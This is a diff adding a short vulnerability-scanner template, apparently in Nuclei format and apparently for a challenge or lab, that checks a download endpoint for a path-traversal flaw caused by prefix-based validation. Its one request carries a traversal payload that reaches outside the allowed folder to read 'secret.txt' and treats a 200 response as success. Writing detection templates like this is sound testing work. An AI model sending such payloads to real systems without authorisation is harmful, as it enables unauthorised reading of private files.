@@ -1,0 +1,17 @@
+id: ch2-file-path-validation
+
+info:
+  name: Insecure path validation allows file access
+  author: vignesh
+  severity: high
+  description: Path traversal possible due to unsafe prefix-based validation
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download?file=../files_evil/secret.txt"
+
+    matchers:
+      - type: status
+        status:
+          - 200
